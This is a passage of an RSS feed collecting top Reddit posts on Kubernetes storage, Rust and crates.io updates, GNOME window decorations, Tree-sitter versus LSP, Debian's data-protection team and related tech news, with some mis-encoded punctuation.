+0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[Iâ€™m running a small 3 node cluster using mini PCs for my home lab for things like Nextcloud, databases, and other services that require persistent storage. Currently everything is creating persistent claims on my main NAS via NFS but too many times Iâ€™ve had unexpected downtime because the NAS decided to break. Iâ€™m wanting to replicate identical data across drives in my cluster for high availability and redundancy. What would be the best way to handle this? All three are equipped with a i5-7500, 32Gi RAM, 256 NVMe drive, a 1T SATA SSD intended to be the replicated disk, and connected to a 1Gbe switch as they donâ€™t have any faster NICs installed. Iâ€™ve looked into Longhorn and Ceph but both highly recommend 10Gbe but tha is not possible for me. Iâ€™ve looked at Minio/Garage but that would only allow S3 which feels limiting (though I donâ€™t have a lot of experience with object storage so I may be naive in my thinking)]]></content:encoded></item><item><title>Underground Resistance Aims To Sabotage AI With Poisoned Data</title><link>https://www.forbes.com/sites/craigsmith/2026/01/21/poison-fountain-and-the-rise-of-an-underground-resistance-to-ai/</link><author>/u/RNSAFFN</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 03:34:19 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>White House posts digitally altered image of woman arrested after ICE protest</title><link>https://www.theguardian.com/us-news/2026/jan/22/white-house-ice-protest-arrest-altered-image</link><author>/u/esporx</author><category>ai</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 23:10:37 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[The White House posted a digitally altered image of a woman who was arrested on Thursday in a case touted by the US attorney general, Pam Bondi, to make it seem as if she was dramatically crying, a Guardian analysis of the image has found.The woman, Nekima Levy Armstrong, also appears to have darker skin in the altered image. Armstrong was one of three people arrested on Thursday in connection to a demonstration that disrupted church services in St Paul, Minnesota, on Sunday. Demonstrators alleged that one of the pastors, David Easterwood, was the acting field director of the St Paul Immigration and Customs Enforcement (ICE) office. Bondi announced the arrests on social media on Thursday morning.The homeland security secretary, Kristi Noem, posted an image of Armstrongâ€™s arrest at 10.21am on Thursday, less than an hour after Bondiâ€™s announcement. The image shows a law enforcement agent, face blurred out, escorting Armstrong, who appears to be handcuffed. Armstrong, dressed in all black, appears to be composed in the picture.A little more than 30 minutes later, the White House posted another image of Armstrongâ€™s arrest in which she is crying. The White House press secretary, Karoline Leavitt, reposted the image. The image posted by the White House is altered, a Guardian analysis found.The Guardian overlaid the White House photo with the Noem photo and found that the law enforcement agents in both pictures line up exactly, confirming they are the same image. There are other similarities between the photos. An unidentified person can be seen in the same place behind the arresting agent. And the arresting agentâ€™s arm appears to be behind Armstrongâ€™s back in exactly the same position.Asked whether the image had been digitally altered, the White House responded by sending a post on X from Kaelan Dorr, the deputy communications director.â€œYET AGAIN to the people who feel the need to reflexively defend perpetrators of heinous crimes in our country I share with you this message: Enforcement of the law will continue. The memes will continue. Thank you for your attention to this matter,â€ he said.The White House X account, which has around 3.5 million followers, has made at least 14 posts with AI since the start of Trumpâ€™s second term, Poynter reported in October.Julius Constantine Motal and David McCoy contributed reporting]]></content:encoded></item><item><title>The Rust GCC backend can now be installed with rustup</title><link>https://www.reddit.com/r/rust/comments/1qk9t1t/the_rust_gcc_backend_can_now_be_installed_with/</link><author>/u/imperioland</author><category>rust</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 23:06:07 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[Starting tomorrow (23rd of January 2026), you will be able (on linux without cross-compilation) to install and use the Rust GCC backend directly from rustup! To do so: rustup component add rustc-codegen-gcc Thanks a lot to Kobzol for all their work to making it a reality!]]></content:encoded></item><item><title>Incredibly detailed isometric map of NYC (made with Qwen-Image-Edit)</title><link>https://cannoneyed.com/isometric-nyc/</link><author>/u/WavierLays</author><category>ai</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 23:02:27 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>awesome-linuxaudio v1.0.0 - A list of software and resources for Linux audio/video/live production</title><link>https://github.com/nodiscc/awesome-linuxaudio/releases/tag/1.0.0</link><author>/u/vegetaaaaaaa</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 22:38:24 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Where does Rust break down?</title><link>https://www.reddit.com/r/rust/comments/1qk8qt7/where_does_rust_break_down/</link><author>/u/PointedPoplars</author><category>rust</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 22:21:47 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[As a preface, Rust is one of my favorite languages alongside Python and C.One of the things I appreciate most about Rust is how intentionally it is designed around abstraction: e.g. function signatures form strict, exhaustive contracts, so Rust functions behave like true black boxes.But all abstractions have leaks, and I'm sure this is true for Rust as well.For example, Python's `len` function has to be defined as a magic method instead of a normal method to avoid exposing a lot of mutability-related abstractions.As a demonstration, assigning `fun = obj.__len__` will still return the correct result when `fun()` is called after appending items to `obj` if `obj` is a list but not a string. This is because Python strings are immutable (and often interned) while its lists are not. Making `len` a magic method enforces late binding of the operation to the object's current state, hiding these implementation differences in normal use and allowing more aggressive optimizations for internal primitives.A classic example for C would be that `i[arr]` and `arr[i]` are equivalent because both are syntactic sugar for `*(arr+i)`TLDR: What are some abstractions in Rust that are invisible to 99% of programmers unless you start digging into the language's deeper mechanics?]]></content:encoded></item><item><title>[Help] with with K3S + Traefik + Gateway API + TCP/UDPRoutes</title><link>https://www.reddit.com/r/kubernetes/comments/1qk84jk/help_with_with_k3s_traefik_gateway_api/</link><author>/u/Leather_Week_860</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 21:57:45 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[I am playing with K3S to try and learn a bit of Kubernetes. Have set up a Fedora VM with K3S, and as per recent docs I am trying to set up the Gateway API, which is supposed to replace Ingress.K3S comes with Traefik installed via Helm, and as per their docs "you should customize Traefik by creating an additional HelmChartConfig manifest in /var/lib/rancher/k3s/server/manifests". Following Traefik's docs, I created such a file to enable the Gateway API, disable Ingress, and then enable Traefik's dashboard and create an HTTPRoute for it:Now, I want to be able to create not only HTTPRoutes but also TCPRoutes and UDPRoutes, as I am trying to set up Syncthing as a deployment in the environment.[...] # Enable Gateway API and disable Ingress providers: kubernetesGateway: enabled: true experimentalChannel: true kubernetesIngress: enabled: false kubernetesCRD: enabled: true [...] Helm reloads Traefik just fine, but when I try to create a TCPRoute or UDPRoute, I keep getting this error:Error: INSTALLATION FAILED: unable to build kubernetes objects from release manifest: [resource mapping not found for name: "syncthing-tcp" namespace: "syncthing" from "": no matches for kind "TCPRoute" in version "gateway.networking.k8s.io/v1alpha2" ensure CRDs are installed first, resource mapping not found for name: "syncthing-udp" namespace: "syncthing" from "": no matches for kind "UDPRoute" in version "gateway.networking.k8s.io/v1alpha2" ensure CRDs are installed first, resource mapping not found for name: "syncthing-discovery" namespace: "syncthing" from "": no matches for kind "UDPRoute" in version "gateway.networking.k8s.io/v1alpha2" ensure CRDs are installed first] helm.go:92: 2026-01-22 18:07:48.516328647 +0100 CET m=+0.768768674 [debug] [resource mapping not found for name: "syncthing-tcp" namespace: "syncthing" from "": no matches for kind "TCPRoute" in version "gateway.networking.k8s.io/v1alpha2" ensure CRDs are installed first, resource mapping not found for name: "syncthing-udp" namespace: "syncthing" from "": no matches for kind "UDPRoute" in version "gateway.networking.k8s.io/v1alpha2" ensure CRDs are installed first, resource mapping not found for name: "syncthing-discovery" namespace: "syncthing" from "": no matches for kind "UDPRoute" in version "gateway.networking.k8s.io/v1alpha2" ensure CRDs are installed first] unable to build kubernetes objects from release manifest I have tried many things, but nothing seems to work. I don't want to mess up with how K3S installs Traefik, but not sure what to try. Any ideas?!]]></content:encoded></item><item><title>Is there a common API response schema to follow?</title><link>https://www.reddit.com/r/golang/comments/1qk74bq/is_there_a_common_api_response_schema_to_follow/</link><author>/u/m477h145h3rm53n</author><category>golang</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 21:18:42 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I tried implementing this API response schema``golang type Response[T any] struct { IsSuccessful booljson:"isSuccessful"json:"data,omitempty"json:"errorMessage,omitempty"` }func NewSuccessResponse[T any](data T) Response[T] { return Response[T]{ IsSuccessful: true, Data: &data, } }func NewEmptySuccessResponse[T any]() Response[T] { return Response[T]{ IsSuccessful: true, Data: nil, } }func NewFailureResponse[T any](errorMessage string) Response[T] { return Response[T]{ IsSuccessful: false, ErrorMessage: errorMessage, Data: nil, } } ```but maybe I don't have to reinvent a structure. Is there a popular one I could follow?]]></content:encoded></item><item><title>So, why *should* GNOME support server side decorations?</title><link>https://blister.zip/posts/gnome-ssd/</link><author>/u/symbolicard</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 21:01:35 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[Cet article est aussi disponible en franÃ§ais.This article contains quite a few technical terms, which I will explain these in the following paragraphs, those that are already familiar with these terms may skip to the next section. A basic understanding of linux and itâ€™s desktop environments is assumed.Server side decorations (SSD) is the term for when when the applicationâ€™s titlebar is drawn by the system and client side decorations (CSD) is the term for when the applications draws itâ€™s own titlebar. KDE prefers the former, while GNOME prefers the latter. KDE and most other desktop environments supports both, while GNOME only supports CSD.Since SSD are drawn by the desktop, instead of by the application, apps that use it have a seperate titlebar (bottom), while apps that are designed around CSD tend to have an integrated titlebar (top).seperate titlebar (bottom) vs integrated titlebar (top)Image credit: Tobias BernardI will refer to the mutter compositor as GNOME, compositors in general as â€œthe systemâ€ and gtk4/libadwaita apps as GNOME apps, for simplicityâ€™s sake.Without further ado, letâ€™s get to the titular question.Why  GNOME support SSD?#Many apps handle CSD poorly.#Certain applications work poorly without SSD. These apps end up having either no titlebar or a weird one, and the user canâ€™t move or resize them easily. Davinci Resolve is one notable example, but itâ€™s not the only one.GNOME is a large enough part of the linux desktop that most applications designed for SSD decorations implement a workaround in order to not be broken on GNOME. Usually, that workaround is libdecor.This sounds fine enough, except libdecor is the  of both worlds because you get the space inefficiency and lack of integration of a traditional titlebar, with all the inconsistency and lack of user customization of an integrated titlebar.Three applications with visually distinct libdecor-provided titlebarsThis is not the fault of the libdecor devs, itâ€™s just because itâ€™s a bandaid fix for a wider issue.Supporting SSD would solve this, as every application that does not wish to use CSD would have a nice native titlebar with consistent shading, colors, and corner radius, and developers would have to deal with less work and frustration.Supporting SSD would make apps â€œFeel more nativeâ€#On windows and macOS, any application can implement CSD in their application and have it respect the spacing, position and look of the titlebar buttons that the SSD equivalents that those platforms provide.The issue with doing that on linux is that the design of the titlebar can vary so wildy depending on the environment that having CSDâ€™s that â€œfeel nativeâ€ is a bit of a losing battle. Offering the option of SSD for non-GNOME apps on GNOME and vice versa would go a long way to making applications feel more native for users that value that sort of thing.Many users of other desktops want their SSD respected.#A lot of users on other desktops are frustrated by GNOME apps not supporting SSD, breaking if SSD is force-enabled.While an app breaking when users do something unsupported is obviously not the developerâ€™s fault, GNOME apps optionally supporting SSD would make many users of other desktops very happy indeed.If youâ€™re wondering why a user would want SSD applied to a GNOME app, some people value titlebar consistency over the design of any individual app. Some users view SSD as an accessibility feature as well.GNOMEâ€™s lack of support hurts the linux desktop.#Linux is already a small market, and GNOME not supporting the de facto standard that is  only hurts the linux desktop by increasing fragmentation.This fragmentation only makes the linux desktop less attractive to developers and, importantly, makes application developers less likely to adopt more modern standards such as wayland.The arguments against SSD support#Many discussions about why GNOME should implement SSD stop at the arguments for it, but obviously there are also arguments against supporting SSD, otherwise GNOME would have implemented them by now.This is the main argument the GNOME developers use to justify why they donâ€™t support SSD. This is true,  is an â€œunstableâ€ protocol, and wayland was originally designed with only CSD in mind. However, wayland was also initally designed without screenshare or global keybinds, standards that GNOME had since adopted.The standard doesnâ€™t pose the same kind of security or design issues that standards like the system tray one do, either.The fact is that itâ€™s adopted by every production-ready desktop compositor other than GNOMEâ€™s mutter, and is relied upon by application and desktop developers alike, making it a de facto standard that is widely adopted.That is to say, while  is technically out of spec, the only thing distinguishing it from any wayland protocol that is â€œin specâ€ is GNOMEâ€™s lack of support for it.â€œWindow decorations are part of the app, and thus shouldnâ€™t be the purview of desktop.â€#Many developers and users see the titlebar as something that is a part of the desktop, while some others disagree. This isnâ€™t a problem, just a difference in philosophy.The real problem is the idea that GNOME project shouldnâ€™t cater to the first group. It would be like GNOME not supporting  and saying that each app  ship their own file picker. But GNOME does support it, and only apps that wish to implement their own file picker do so.Since both approaches are used, and liked, miscellaneous advantages and disadvantages of either approach are irrelevant, and so are other arguments pertaining to design. This is why I havenâ€™t brought them up.Hopefully I have made my point as to why it would be worthwhile for GNOME to adopt server side decorations, but a question still remains.What would it look like?#I have touched on what an implementation of SSD would look like a few times throughout this article without actually fully explaining what it would look like. So.Obviously GNOME would implement the relevant protocols and enable server side decorations on all application that donâ€™t explicitely request SSD. This is in order to have SSD applied to apps that in only provide CSD as a fallback for compositors that donâ€™t support SSD.To be clear, this  apply to apps that are designed for a united headerbar, like GNOME apps.On other desktops, however, GNOME apps would still request to not have SSD applied, a preference that is respected by every mainstream desktop. The only difference is that they would allow users the option to force a titlebar on GNOME apps. In this scenario, the GNOME app would remove the integrated window title and controls.This would be the best of both worlds, since GNOME users would enjoy more consistent titlebars and window shadows on third party apps and  on other desktops would gain the ability to have SSD on GNOME apps if they so wish.GNOMEâ€™s lack of support for server side decorations is the single biggest issue with the GNOME desktop environment right now, in my opinion, so I sincerely hope this article can serve as a push to get it implemented.If you want to help me with this, you can .]]></content:encoded></item><item><title>Help KDE Keep EU funding</title><link>https://www.reddit.com/r/linux/comments/1qk6icf/help_kde_keep_eu_funding/</link><author>/u/lajka30</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 20:55:48 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Tree-sitter vs. LSP</title><link>https://lambdaland.org/posts/2026-01-21_tree-sitter_vs_lsp/</link><author>/u/brightlystar</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 20:54:20 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[I got asked a good question today: what is the difference between Tree-sitter and a language server? I donâ€™t understand how either of these tools work in depth, so Iâ€™m just going to explain from an ,  point of view.Tree-sitter is a . What this means is that you can hand Tree-sitter a description for a programming language and it will create a program that will parse that language for you. Whatâ€™s special about Tree-sitter is that it is a.) fast, and b.) can tolerate  in the input. These two properties make Tree-sitter ideal for creating syntax highlighting engines in text editors. When youâ€™re editing a program,  the program will be in a syntactically invalid state. During that time, you donâ€™t want your colors changing or just outright breaking while youâ€™re typing. NaÃ¯ve regex-based syntax highlighters frequently suffer from this issue.Tree-sitter also provides a query language where you can make queries against the parse tree. I use this in the Emacs package Iâ€™m trying to develop to add Typst support to the Citar citation/bibliography tool: I can ask Tree-sitter to find a particular syntax object; it is safer and more robust than using a regular expression because it can do similar parsing to the Typst engine itself.In short, Tree-sitter provides syntax highlighting that is faithful to how the language implementation parses the program, instead of relying on regular expressions that incidentally come close.A  is a program that can analyze a program and report interesting information about that program to a text editor. A standard, called the Language Server Protocol (LSP), defines the kinds of JSON messages that pass between a text editor and the server. The protocol is an open standard; any language and any text editor can take advantage of the protocol to get nice smart programming helps in their system. Language servers can provide information like locating the definition of a symbol, possible completions at the cursor point, etc. to a text editor which can then decide how and when to display or use this information.Language servers solve the â€œ

 problemâ€ where 
 programming languages and 
 text editors would mean there have to be 
 implementations for language analyzers. Now, every language just needs a language server, and every editor needs to be able to speak the LSP protocol.Language servers are powerful because they can hook into the languageâ€™s runtime and compiler toolchain to get  answers to user queries. For example, suppose you have two versions of a  function, one imported from a  library, and another from a  library. If you use a tool like the dumb-jump package in Emacs
and you use it to jump to the definition for a call to , it might get confused as to where to go because itâ€™s not sure what module is in scope at the point. A language server, on the other hand, should have access to this information and would not get confused.
  Using a language server for highlighting
  #It  possible to use the language server for syntax highlighting. I am not aware of any particularly strong reasons why one would want to (or  want to) do this. The language server can be a more complicated program and so could surface particularly detailed information about the syntax; it might also be slower than tree-sitter.Emacsâ€™ built-in LSP client, Eglot, recently added eglot-semantic-tokens-mode to support syntax highlighting as provided from the language server. I have tried this a little bit in Rust code and it seems fine; the Tree-sitter-based syntax highlighting has been working just fine for me, so I will probably stick to that unless I find a compelling reason to use the LSP-based highlighting. Thanks to a comment on HN, I now know of a good reason why you would want to use a language server for syntax highlighting: the Rust language server rust-analyzer can tell your text editor when a variable reference is mutable or not, which means you could highlight  references differently than non- ones. Thanks to David Barsky for the tip!I wrote all of the above article. I did not ask an LLM to generate any portion of it. Please know that whenever you read something on my blog, it comes 100% from a humanâ€”me, Ashton Wiersdorf.I am not so anti-AI to say that LLMs are worthless or should never be used. Iâ€™ve used LLMs a little bit. I think theyâ€™re fantastic at translating between languages; this seems to be something that they should be good at doing. Theyâ€™re helpful at writing some boring parts of the code I write. However, most of the time I find that I can typically write the tricky bits of the code about as fast as I could specify to an LLM what I want.I know that an LLM could have generated a facile pile of text much like the above, and honestly it would probably be decently helpful. However, know that what you have just read came directly from the fingers of a person who thought about the topic and bent his effort to helping you understand. This is from  human who understands the meaning behind each word here. I do not play games with syntax and generate answer-shaped blog posts. There is real meaning here. Enjoy it, and go forth and make more of it.]]></content:encoded></item><item><title>crates.io development update | Rust Blog - A new &quot;Security&quot; tab, migration to Svelte for the front-end, support for GitLab CI/CD Trusted Publishing, Lines of Code metrics</title><link>https://blog.rust-lang.org/2026/01/21/crates-io-development-update/</link><author>/u/nik-rev</author><category>rust</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 20:24:54 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[Time flies! Six months have passed since our last crates.io development update, so it's time for another one. Here's a summary of the most notable changes and improvements made to crates.io over the past six months.Crate pages now have a new "Security" tab that displays security advisories from the RustSec database. This allows you to quickly see if a crate has known vulnerabilities before adding it as a dependency.The tab shows known vulnerabilities for the crate along with the affected version ranges.This feature is still a work in progress, and we plan to add more functionality in the future. We would like to thank the OpenSSF (Open Source Security Foundation) for funding this work and Dirkjan Ochtman for implementing it.
Trusted Publishing EnhancementsIn our July 2025 update, we announced Trusted Publishing support for GitHub Actions. Since then, we have made several enhancements to this feature.Trusted Publishing now supports GitLab CI/CD in addition to GitHub Actions. This allows GitLab users to publish crates without managing API tokens, using the same OIDC-based authentication flow.Note that this currently only works with GitLab.com. Self-hosted GitLab instances are not supported yet. The crates.io implementation has been refactored to support multiple CI providers, so adding support for other platforms like Codeberg/Forgejo in the future should be straightforward. Contributions are welcome!
Trusted Publishing Only ModeCrate owners can now enforce Trusted Publishing for their crates. When enabled in the crate settings, traditional API token-based publishing is disabled, and only Trusted Publishing can be used to publish new versions. This reduces the risk of unauthorized publishes from leaked API tokens.The  and  GitHub Actions triggers are now blocked from Trusted Publishing. These triggers have been responsible for multiple security incidents in the GitHub Actions ecosystem and are not worth the risk.Crate pages now display source lines of code (SLOC) metrics, giving you insight into the size of a crate before adding it as a dependency. This metric is calculated in a background job after publishing using the tokei crate. It is also shown on OpenGraph images:
Publication Time in IndexA new  field has been added to crate index entries, recording when each version was published. This enables several use cases:Cargo can implement cooldown periods for new versions in the futureCargo can replay dependency resolution as if it were a past date, though yanked versions remain yankedServices like Renovate can determine release dates without additional API requests
Svelte Frontend MigrationAt the end of 2025, the crates.io team evaluated several options for modernizing our frontend and decided to experiment with porting the website to Svelte. The goal is to create a one-to-one port of the existing functionality before adding new features.This migration is still considered experimental and is a work in progress. Using a more mainstream framework should make it easier for new contributors to work on the frontend. The new Svelte frontend uses TypeScript and generates type-safe API client code from our OpenAPI description, so types flow from the Rust backend to the TypeScript frontend automatically.Thanks to eth3lbert for the helpful reviews and guidance on Svelte best practices. We'll share more details in a future update.These were some of the more visible changes to crates.io over the past six months, but a lot has happened "under the hood" as well.Cargo user agent filtering: We noticed that download graphs were showing a constant background level of downloads even for unpopular crates due to bots, scrapers, and mirrors. Download counts are now filtered to only include requests from Cargo, providing more accurate statistics.: Emails from crates.io now support HTML formatting.: OAuth access tokens from GitHub are now encrypted at rest in the database. While we have no evidence of any abuse, we decided to improve our security posture. The tokens were never included in the daily database dump, and the old unencrypted column has been removed.: Crate pages now display a "Browse source" link in the sidebar that points to the corresponding docs.rs page. Thanks to Carol Nichols for implementing this feature.: The sparse index at index.crates.io is now served primarily via Fastly to conserve our AWS credits for other use cases. In the past month, static.crates.io served approximately 1.6 PB across 11 billion requests, while index.crates.io served approximately 740 TB across 19 billion requests. A big thank you to Fastly for providing free CDN services through their Fast Forward program!OpenGraph image improvements: We fixed emoji and CJK character rendering in OpenGraph images, which was caused by missing fonts on our server.Background worker performance: Database indexes were optimized to improve background job processing performance.CloudFront invalidation improvements: Invalidation requests are now batched to avoid hitting AWS rate limits when publishing large workspaces.We hope you enjoyed this update on the development of crates.io. If you have any feedback or questions, please let us know on Zulip or GitHub. We are always happy to hear from you and are looking forward to your feedback!]]></content:encoded></item><item><title>Debian Urgently Seeks Volunteers After Data Protection Team Resigns</title><link>https://linuxiac.com/debian-urgently-seeks-volunteers-after-data-protection-team-resigns/</link><author>/u/CackleRooster</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 19:59:28 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Andreas Tille, a Debian Project Leader, recently sent an unexpected message to the Debian mailing lists, announcing that the project is urgently seeking new volunteers to rebuild its Data Protection Team after all current members stepped down, leaving the project without a dedicated group to handle privacy and data protection matters.The Data Protection Team was established in 2018 in response to new European data protection legislation. Its role has been to act as a point of contact for external inquiries about what personal data the project holds and to advise Debian contributors on data protection obligations.Additionally, the team was also responsible for drafting Debianâ€™s public privacy policy and coordinating responses to data access and privacy-related requests.Coincidence or not, all three team members have now resigned simultaneously. So, Tille formally revoked their delegation and thanked them for their work over the past years. With their departure, the team currently has no active members.â€œThe fact that all team members have stepped back at the same time shouldmake it clear that we urgently need new volunteers to fulfil this role.â€According to the message, despite a constructive discussion on the topic during the most recent DebConf, no new volunteers came forward. As a result, the Debian Project Leader is temporarily handling all data protection inquiries, adding to an already heavy workload.So, Debian is now calling on contributors with an interest in privacy and data protection to step in. Potential volunteers would be expected to help maintain and improve the existing privacy policy and to work with Debian teams that process personal data, improving workflows for handling data protection requests.The project has stressed that restoring a functioning Data Protection Team is urgent, both to meet legal obligations and to ensure that privacy-related inquiries are handled in a timely and sustainable manner.]]></content:encoded></item><item><title>How do you handle orphaned ConfigMaps and Secrets without breaking prod?</title><link>https://www.reddit.com/r/kubernetes/comments/1qk4yxq/how_do_you_handle_orphaned_configmaps_and_secrets/</link><author>/u/Important-Night9624</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 19:58:13 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[I'm doing some spring cleaning on our clusters and seeing tons of ConfigMaps and Secrets that look unused, but I'm paranoid about deleting them.You know the deal- teams refactor, Helm releases get abandoned, but the old configs stick around because  doesn't prune them automatically. Since K8s garbage collection only works if  are set (which we often miss), they just pile up.How are you guys handling this?Manual cleanup? (Sounds like a nightmare)Custom scripts? (Grepping for references in all manifests?)Just let them rot? (Storage is cheap, right?)I'm specifically worried about edge cases like secrets used in Ingress TLS or  that are harder to track down than standard volume mounts.â€‹Anyone have a solid workflow for this that doesn't involve "scream testing" (delete and wait for someone to complain)?]]></content:encoded></item><item><title>What are your favorite lesser-known open-source applications for productivity on Linux?</title><link>https://www.reddit.com/r/linux/comments/1qk4syq/what_are_your_favorite_lesserknown_opensource/</link><author>/u/corriente6</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 19:52:09 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[As a long-time Linux user, I've come to appreciate the wealth of open-source applications available. While many users are familiar with staples like LibreOffice and GIMP, I'm curious about the hidden gems that others find invaluable for productivity. For instance, I recently discovered Taskwarrior, a command-line task manager that has significantly improved my organization. Additionally, tools like Zettlr for markdown editing and Joplin for note-taking have become essential in my workflow. I'm eager to hear what lesser-known applications you all use to enhance your productivity on Linux. What are your go-to tools, and how have they made a difference in your daily tasks?]]></content:encoded></item><item><title>[R] CVPR rebuttal advice needed</title><link>https://www.reddit.com/r/MachineLearning/comments/1qk4m9h/r_cvpr_rebuttal_advice_needed/</link><author>/u/jackeswin</author><category>ai</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 19:45:27 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[I received 3 CVPR reviews: 2Ã— Borderline Accept and 1Ã— Weak Reject with confidence 4,3,3.Both borderline reviewers explicitly state that the method is novel, technically sound, and that they would increase their score if the concerns are addressed. The weak reject is not based on technical correctness, but mainly on a perceived venue-fit issue; the reviewer also mentions they are not an expert in the domain and are open to changing their recommendation, especially if other reviewers disagree. Actually, the paperâ€™s topic is explicitly listed in the CVPR CFP. No reviewer raises fundamental flaws or correctness issues. Based on your experience, is this a situation where a focused rebuttal can realistically change the outcome?]]></content:encoded></item><item><title>I wrote a configurable browser launcher.</title><link>https://www.reddit.com/r/linux/comments/1qk4ecx/i_wrote_a_configurable_browser_launcher/</link><author>/u/ComprehensiveSwitch</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 19:37:22 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[More than a pretty launcher, Switchyard lets you configure websites to open in a given browser based on domain matches, patterns, and regular expressions. Itâ€™s inspired by apps like Choosy on the Mac. ]]></content:encoded></item><item><title>Alternative for the archived aws-lambda-go-api-proxy</title><link>https://www.reddit.com/r/golang/comments/1qk3p9j/alternative_for_the_archived_awslambdagoapiproxy/</link><author>/u/diegofrings</author><category>golang</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 19:12:16 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[It looks pretty much like in the examples:func main() { http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) { io.WriteString(w, "Hello") }) lambda.Start(httpadapter.New(http.DefaultServeMux).ProxyWithContext) } Now we realized, that the proxy library is archived: This repository was archived by the owner on May 21, 2025. It is now read-only.But I can't seem to find any hint on what the new preferred way of doing this is.Has anyone found an alternative? Or are you just keep on using the archived library?]]></content:encoded></item><item><title>Is this AI or just someone who doesn&apos;t care at all?</title><link>https://www.reddit.com/r/linux/comments/1qk3ag3/is_this_ai_or_just_someone_who_doesnt_care_at_all/</link><author>/u/Adopolis23</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 18:57:39 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Needed a mouse pad for work so got this one off Amazon and didnt really look at it much. After staring at it on my desk a bit I notice so many typos and spelling mistakes it has to be either AI or just horrible QC and someone who doesn't care. It was like less than 10$ so its whatever but see how many mistakes you can find on this. ]]></content:encoded></item><item><title>Your Microservices architecture is failing because your Product Topology is a mess</title><link>https://www.hyperact.co.uk/blog/product-topology</link><author>/u/ArtisticProgrammer11</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 18:50:10 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[We often use 'product' as a catch-all for digital products, platforms, and services. So when we describe ourselves as a 'product transformation consultancy,' what we're really saying is: we can help you transform your digital products, services, and platforms (and organisation). But you'll probably agree, that's a bit of a mouthful.While it's deliberate (in the sense that we apply product-thinking to products, platforms, and services) it also creates confusion, which isnâ€™t helpful when trying to affect change in an organisationÂ â€“ particularly when adopting the Product Operating Model.We regularly see organisations trapped in debates over these definitions, or worse, making critical structural decisions based on unclear distinctions.Often, these problems manifest themselves as:Products that aren't actually products (they're projects in disguise)Product teams subservient to service ownership, stripped of empowermentInternal platforms neglected or treated as cost centresBoundaries drawn too narrow, creating constant coordination overheadBoundaries drawn too wide, overloading teams beyond their cognitive capacityProducts designed in isolation, devoid of service contextWhile it's important to start with clear definitions, the definitions themselves are only half the battle.This article sets out how we characterise products, platforms, and services, how to draw boundaries between them, and makes the case for treating each of them â€˜as-a-productâ€™.We're going to start with services, as these sit at the top of the product topology.A (digital) service is software responsible for helping end-users achieve one specific, high-level outcome, typically through a linear user journey. For example: learning to drive, applying for a mortgage, or switching energy suppliers.Service 